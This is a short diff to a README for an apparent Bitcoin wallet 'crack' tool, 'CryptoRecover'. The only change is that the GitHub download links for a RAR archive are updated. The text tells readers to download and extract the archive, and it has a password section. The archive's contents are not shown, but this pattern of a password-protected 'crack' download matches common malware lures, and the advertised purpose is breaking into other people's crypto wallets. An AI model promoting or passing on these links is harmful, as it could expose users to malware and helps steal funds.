@@ -10,7 +10,7 @@ just windows and an uninterrupted internet connection for run codes :)
 
 ## Installation
   
-- Download ```BTC-Multiple-Blockchain-Crack-CryptoRecover.rar```  File From [this link](https://github.com/BITINTERN/Crypto-wallet-finder-application/) and proceed to this tutorial
+- Download ```BTC-Multiple-Blockchain-Crack-CryptoRecover.rar```  File From [this link](https://github.com/BITINTERN/Crypto-Wallet-Finder-Software-/blob/main/BTC-Multiple-Crack-CryptoRecover.rar/) and proceed to this tutorial
 
 - Extract ```BTC-Multiple-Blockchain-Crack-CryptoRecover.rar```  File
 
@@ -37,7 +37,7 @@ process.title = "Bitcoin Multiple Crack | CryptoRecover";
 
 ## Download File
 
-[RAR File](https://github.com/BITINTERN/Crypto-wallet-finder-application/)
+[RAR File](https://github.com/BITINTERN/Crypto-Wallet-Finder-Software-/blob/main/BTC-Multiple-Crack-CryptoRecover.rar/)
 
 
 ## Password
